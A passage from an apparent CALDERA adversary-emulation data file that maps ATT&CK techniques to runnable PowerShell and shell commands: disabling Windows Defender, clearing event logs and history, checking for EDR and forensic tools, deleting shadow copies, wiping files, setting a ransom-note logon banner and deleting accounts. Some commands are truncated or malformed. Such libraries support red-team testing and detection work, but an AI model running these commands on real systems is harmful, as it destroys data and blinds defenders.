        "description": "Remove a downloaded payload file",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "cleanup": "rm #{payload}\n"
                }
            },
            "linux": {
                "sh": {
                    "cleanup": "rm #{payload}\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "cleanup": "Remove-Item -Force -Path \"#{payload}\""
                }
            }
        },
        "id__dependence__fact": [
            "4cd4eb44-29a7-4259-91ae-e457b283a880",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "4cd4eb44-29a7-4259-91ae-e457b283a880"
    },
    "T1497.001__defense-evasion__Virtualization/Sandbox Evasion: System Checks__7a6ba833-de40-466a-8969-5c37b13603e0": {
        "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$forensicProcesses = @(\n    \"apimonitor-x64\",\n    \"apimonitor-x86\",\n    \"autopsy64\",\n    \"autopsy\",\n    \"autoruns64\",\n    \"autoruns\",\n    \"autorunsc64\",\n    \"autorunsc\",\n    \"binaryninja\",\n    \"blacklight\",\n    \"cff explorer\",\n    \"cutter\",\n    \"de4dot\",\n    \"debugview\",\n    \"diskmon\",\n    \"dnsd\",\n    \"dnspy\",\n    \"dotpeek32\",\n    \"dotpeek64\",\n    \"dumpcap\",\n    \"evidence center\",\n    \"exeinfope\",\n    \"fakedns\",\n    \"fakenet\",\n    \"ffdec\",\n    \"fiddler\",\n    \"fileinsight\",\n    \"floss\",\n    \"gdb\",\n    \"hiew32demo\",\n    \"hiew32\",\n    \"hollows_hunter\",\n    \"idaq64\",\n    \"idaq\",\n    \"idr\",\n    \"ildasm\",\n    \"ilspy\",\n    \"jd-gui\",\n    \"lordpe\",\n    \"officemalscanner\",\n    \"ollydbg\",\n    \"pdfstreamdumper\",\n    \"pe-bear\",\n    \"pebrowse64\",\n    \"peid\",\n    \"pe-sieve32\",\n    \"pe-sieve64\",\n    \"pestudio\",\n    \"peview\",\n    \"ppee\",\n    \"procdump64\",\n    \"procdump\",\n    \"processhacker\",\n    \"procexp64\",\n    \"procexp\",\n    \"procmon\",\n    \"prodiscoverbasic\",\n    \"py2exedecompiler\",\n    \"r2agent\",\n    \"rabin2\",\n    \"radare2\",\n    \"ramcapture64\",\n    \"ramcapture\",\n    \"reflector\",\n    \"regmon\",\n    \"resourcehacker\",\n    \"retdec-ar-extractor\",\n    \"retdec-bin2llvmir\",\n    \"retdec-bin2pat\",\n    \"retdec-config\",\n    \"retdec-fileinfo\",\n    \"retdec-getsig\",\n    \"retdec-idr2pat\",\n    \"retdec-llvmir2hll\",\n    \"retdec-macho-extractor\",\n    \"retdec-pat2yara\",\n    \"retdec-stacofin\",\n    \"retdec-unpacker\",\n    \"retdec-yarac\",\n    \"rundotnetdll\",\n    \"sbiesvc\",\n    \"scdbg\",\n    \"scylla_x64\",\n    \"scylla_x86\",\n    \"shellcode_launcher\",\n    \"solarwindsdiagnostics\",\n    \"sysmon64\",\n    \"sysmon\",\n    \"task explorer\",\n    \"task explorer-x64\",\n    \"tcpdump\",\n    \"tcpvcon\",\n    \"tcpview\",\n    \"vboxservice\",\n    \"win32_remote\",\n    \"win64_remotex64\",\n    \"windbg\",\n    \"windump\",\n    \"winhex64\",\n    \"winhex\",\n    \"winobj\",\n    \"wireshark\",\n    \"x32dbg\",\n    \"x64dbg\",\n    \"xwforensics64\",\n    \"xwforensics\",\n    \"redcloak\",\n    \"avgsvc\",\n    \"avgui\",\n    \"avgsvca\",\n    \"avgidsagent\",\n    \"avgsvcx\",\n    \"avgwdsvcx\",\n    \"avgadminclientservice\",\n    \"afwserv\",\n    \"avastui\",\n    \"avastsvc\",\n    \"aswidsagent\",\n    \"aswidsagenta\",\n    \"aswengsrv\",\n    \"avastavwrapper\",\n    \"bccavsvc\",\n    \"psanhost\",\n    \"psuaservice\",\n    \"psuamain\",\n    \"avp\",\n    \"avpui\",\n    \"ksde\",\n    \"ksdeui\",\n    \"tanium\",\n    \"taniumclient\",\n    \"taniumdetectengine\",\n    \"taniumendpointindex\",\n    \"taniumtracecli\",\n    \"taniumtracewebsocketclient64\"\n);\n\nfunction Find-ForensicProcesses {\n    param (\n        $ForensicProcessList\n    );\n    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;\n    foreach ($proc in $CurrentProcesses) {\n        foreach ($forensicProc in $ForensicProcessList) {\n            if ($proc.name -like $forensicProc) {\n                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;\n                Write-Host \"[!] Forensic process found: \" $proc.Name;\n                Write-Host \"[!] Path: \" $procPath.Path;\n            }\n        }\n    }\n}\n\nFind-ForensicProcesses($forensicProcesses);"
                }
            }
        },
        "id__dependence__fact": [
            "7a6ba833-de40-466a-8969-5c37b13603e0",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "7a6ba833-de40-466a-8969-5c37b13603e0"
    },
    "T1070.003__defense-evasion__Indicator Removal on Host: Clear Command History__43b3754c-def4-4699-a673-1d85648fda6a": {
        "description": "Stop terminal from logging history",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.003",
            "name": "Indicator Removal on Host: Clear Command History"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "> $HOME/.bash_history && unset HISTFILE\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "> $HOME/.bash_history && unset HISTFILE\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "Clear-History;Clear"
                }
            }
        },
        "id__dependence__fact": [
            "43b3754c-def4-4699-a673-1d85648fda6a",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "43b3754c-def4-4699-a673-1d85648fda6a"
    },
    "T1497.003__defense-evasion__Virtualization/Sandbox Evasion: Time Based Evasion__36eecb80-ede3-442b-8774-956e906aff02": {
        "description": "Pause all operations to avoid making noise",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1497.003",
            "name": "Virtualization/Sandbox Evasion: Time Based Evasion"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "sleep 60"
                }
            },
            "linux": {
                "sh": {
                    "command": "sleep 60"
                }
            },
            "windows": {
                "psh": {
                    "command": "sleep 60"
                }
            }
        },
        "id__dependence__fact": [
            "36eecb80-ede3-442b-8774-956e906aff02",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "36eecb80-ede3-442b-8774-956e906aff02"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__b007f6e8-4a87-4440-8888-29ceab047d9b": {
        "description": "Disable Windows Defender All",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n",
                    "cleanup": "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n"
                }
            }
        },
        "id__dependence__fact": [
            "b007f6e8-4a87-4440-8888-29ceab047d9b",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "b007f6e8-4a87-4440-8888-29ceab047d9b"
    },
    "T1497.001__defense-evasion__Virtualization/Sandbox Evasion: System Checks__1258b063-27d6-489b-a677-4807faacf868": {
        "description": "Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "$securityServices = @(\n    \"msmpeng\",\n    \"windefend\",\n    \"mssense\",\n    \"sense\",\n    \"microsoft.tri.sensor\",\n    \"microsoft.tri.sensor.updater\",\n    \"cavp\",\n    \"cb\",\n    \"carbonblack\",\n    \"carbonblackk\",\n    \"cbcomms\",\n    \"cbstream\",\n    \"csfalconservice\",\n    \"csfalconcontainer\",\n    \"csagent\",\n    \"csdevicecontrol\",\n    \"csfalconservice\",\n    \"xagt\",\n    \"xagtnotif\",\n    \"fe_avk\",\n    \"fekern\",\n    \"feelam\",\n    \"fewscservice\",\n    \"ekrn\",\n    \"eguiproxy\",\n    \"egui\",\n    \"eamonm\",\n    \"eelam\",\n    \"ehdrv\",\n    \"ekrnepfw\",\n    \"epfwwfp\",\n    \"ekbdflt\",\n    \"epfw\",\n    \"fsgk32st\",\n    \"fswebuid\",\n    \"fsgk32\",\n    \"fsma32\",\n    \"fssm32\",\n    \"fnrb32\",\n    \"fsaua\",\n    \"fsorsp\",\n    \"fsav32\",\n    \"f-secure gatekeeper handler starter\",\n    \"f-secure network request broker\",\n    \"f-secure webui daemon\",\n    \"fsma\",\n    \"fsorspclient\",\n    \"f-secure gatekeeper\",\n    \"f-secure hips\",\n    \"fsbts\",\n    \"fsni\",\n    \"fsvista\",\n    \"f-secure filter\",\n    \"f-secure recognizer\",\n    \"fses\",\n    \"fsfw\",\n    \"fsdfw\",\n    \"fsms\",\n    \"fsdevcon\"\n);\n\n$currentServices = Get-Service | Select-Object -Property Name;\nforeach ($svc in $currentServices) {\n    foreach ($secSvc in $securityServices) {\n        if ($svc.Name -like $secSvc) {\n            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;\n            Write-Host \"[!] Security service found:\";\n            Write-Host \"    Service Name:`t\", $svcDetails.Name;\n            Write-Host \"    Display Name:`t\", $svcDetails.DisplayName;\n            Write-Host \"    Status:`t`t\", $svcDetails.Status;\n            Write-Host \"\";\n        }\n    }\n}\n"
                }
            }
        },
        "id__dependence__fact": [
            "1258b063-27d6-489b-a677-4807faacf868",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "1258b063-27d6-489b-a677-4807faacf868"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__49470433-30ce-4714-a44b-bea9dbbeca9a": {
        "description": "Disable Windows Defender Real-Time Protection",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) {\n  Set-MPPreference -DisableRealtimeMonitoring 1;\n} else {\n  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;\n  if ($service) {\n    if ($service.Status -eq \"Running\") {\n      Stop-Service WinDefend;\n    }\n  } else {\n    echo \"Windows Defender service not found.\";\n    exit 1;\n  };\n};\n",
                    "cleanup": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) { Set-MPPreference -DisableRealtimeMonitoring 0; } else { $service = Get-Service WinDefend -ErrorAction SilentlyContinue; if ($service) { Start-Service WinDefend; } else { echo \"Windows Defender service not found.\"; exit 1; }; };"
                }
            }
        },
        "id__dependence__fact": [
            "49470433-30ce-4714-a44b-bea9dbbeca9a",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "49470433-30ce-4714-a44b-bea9dbbeca9a"
    },
    "T1070.004__defense-evasion__Indicator Removal on Host: File Deletion__5f844ac9-5f24-4196-a70d-17f0bd44a934": {
        "description": "Deadman ability to delete agent file after termination.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\n$processClass = Get-CimClass -ClassName Win32_Process;\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\n    Commandline = 'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{location}\"';\n    ProcessStartupInformation = [CimInstance]$startupInfo\n};\n"
                }
            },
            "darwin": {
                "sh": {
                    "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;"
                }
            }
        },
        "id__dependence__fact": [
            "5f844ac9-5f24-4196-a70d-17f0bd44a934",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e": {
        "description": "Ensure the ExecutionPolicy is turned to Bypass",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"
                }
            }
        },
        "id__dependence__fact": [
            "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e"
    },
    "T1070.001__defense-evasion__Indicator Removal on Host: Clear Windows Event Logs__fcf71ee3-d1a9-4136-b919-9e5f6da43608": {
        "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.001",
            "name": "Indicator Removal on Host: Clear Windows Event Logs"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"
                }
            }
        },
        "id__dependence__fact": [
            "fcf71ee3-d1a9-4136-b919-9e5f6da43608",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "fcf71ee3-d1a9-4136-b919-9e5f6da43608"
    },
    "T1490__impact__Inhibit System Recovery__409acf7907007b041753a5f452b3df9b": {
        "description": "Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1490",
            "name": "Inhibit System Recovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "409acf7907007b041753a5f452b3df9b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "409acf7907007b041753a5f452b3df9b"
    },
    "T1485__impact__Data Destruction__b74b60096fb49650e27e470047a2b9c9": {
        "description": "Overwrites and deletes a file using SysInternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1485",
            "name": "Data Destruction"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (-not (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt\")) { New-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt\" -Force }; & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\\sdelete.exe\" -accepteula \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b74b60096fb49650e27e470047a2b9c9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b74b60096fb49650e27e470047a2b9c9"
    },
    "T1486__impact__Data Encrypted for Impact__f22a27383f804337af8e690aae594d97": {
        "description": "Gpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1486",
            "name": "Data Encrypted for Impact"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item '$env:temp\\test.txt.gpg' -force -erroraction silentlycontinue | out-null",
                    "command": "if (test-path 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe') { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; invoke-webrequest \"https://files.gpg4win.org/gpg4win-4.1.0.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\"; cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\" /S};  ;  cmd /c 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe' -c '$env:temp\\test.txt'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f22a27383f804337af8e690aae594d97",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f22a27383f804337af8e690aae594d97"
    },
    "T1491.001__impact__Defacement: Internal Defacement__90adc98ddf396bb7cb3b90a1f090a0e0": {
        "description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1491.001",
            "name": "Defacement: Internal Defacement"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$updateWallpapercode = @' ; using System.Runtime.InteropServices; namespace Win32{;     public class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] ;          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;          ;          public static void SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);         };     }; } ; '@; if (Test-Path -Path;      $orgImg = Get-Content -Path \"#{pointer_to_orginal_wallpaper}\";      add-type $updateWallpapercode ;      [Win32.Wallpaper]::SetWallpaper($orgImg); }; Remove-Item \"#{pointer_to_orginal_wallpaper}\" -ErrorAction Ignore; Remove-Item \"#{wallpaper_location}\" -ErrorAction Ignore",
                    "command": "$url = \"#{url_of_wallpaper}\"; $imgLocation = \"#{wallpaper_location}\"; $orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper; $orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"; $updateWallpapercode = @' ; using System.Runtime.InteropServices; namespace Win32{;     public class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] ;          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;          ;          public static void SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);         };     }; } ; '@; $wc = New-Object System.Net.WebClient  ; try{  ;     $wc.DownloadFile($url, $imgLocation);     add-type $updateWallpapercode ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; catch [System.Net.WebException]{  ;     Write-Host(\"Cannot download $url\") ;     add-type $updateWallpapercode ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; finally{    ;     $wc.Dispose()  ; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "90adc98ddf396bb7cb3b90a1f090a0e0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "90adc98ddf396bb7cb3b90a1f090a0e0"
    },
    "T1531__impact__Account Access Removal__e1ba582a3787829bb7f146009a040c8b": {
        "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1531",
            "name": "Account Access Removal"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "N/A",
                    "command": "Connect-AzureAD; $userprincipalname = \"atomicredteam@yourdomain.com\"; Remove-AzureADUser -ObjectId $userprincipalname",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e1ba582a3787829bb7f146009a040c8b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e1ba582a3787829bb7f146009a040c8b"
    },
    "T1531__impact__Account Access Removal__3f71c3360964b1a8c81618eb963c05f9": {
        "description": "This test will remove an account from the domain admins group\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1531",
            "name": "Account Access Removal"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$PWord = ConvertTo-SecureString -String; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList; if((Get-ADUser;   Remove-ADGroupMember -Identity \"Domain Admins\" -Members; } else{;     write-host \"Error - Make sure #{remove_user} is in the domain admins group\" -foregroundcolor Red; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3f71c3360964b1a8c81618eb963c05f9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3f71c3360964b1a8c81618eb963c05f9"
    },
    "T1531__impact__Account Access Removal__c3f187080c141397bf8af092c44697a7": {
        "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1531",
            "name": "Account Access Removal"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "N/A",
                    "command": "az login; $userprincipalname = \"atomicredteam@yourdomain.com\"; az ad user delete --id $userprincipalname",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c3f187080c141397bf8af092c44697a7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c3f187080c141397bf8af092c44697a7"
    },
    "T1490__impact__Inhibit System Recovery__e90756bb6dcd21462dc4cc452661df91": {
        "description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1490",
            "name": "Inhibit System Recovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e90756bb6dcd21462dc4cc452661df91",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e90756bb6dcd21462dc4cc452661df91"
    },
    "T1491.001__impact__Defacement: Internal Defacement__2fc2e45dde68ab78a97a22ca138652e1": {
        "description": "Display ransom message to users at system start-up by configuring registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n\n[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1491.001",
            "name": "Defacement: Internal Defacement"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force",
                    "command": "$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption).LegalNoticeCaption; $orgLegalNoticeText = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText).LegalNoticeText; $newLegalNoticeCaption = \"PYSA\"; $newLegalNoticeText = \"Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org\"; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2fc2e45dde68ab78a97a22ca138652e1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2fc2e45dde68ab78a97a22ca138652e1"
    },
    "T1021.001__lateral-movement__Remote Services: Remote Desktop Protocol__28ed45c4da059b14a1b2d4f061b912b8": {
        "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.001",
            "name": "Remote Services: Remote Desktop Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$p=Tasklist /svc /fi \"IMAGENAME eq mstsc.exe\" /fo csv | convertfrom-csv; if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }",
                    "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  $Server=#{logonserver}; $User = Join-Path; $Password=\"#{password}\"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo \"RDP connection established\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "28ed45c4da059b14a1b2d4f061b912b8",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "28ed45c4da059b14a1b2d4f061b912b8"
    },
    "T1570__lateral-movement__Lateral Tool Transfer__5458332f329c896a133982a7df20d358": {
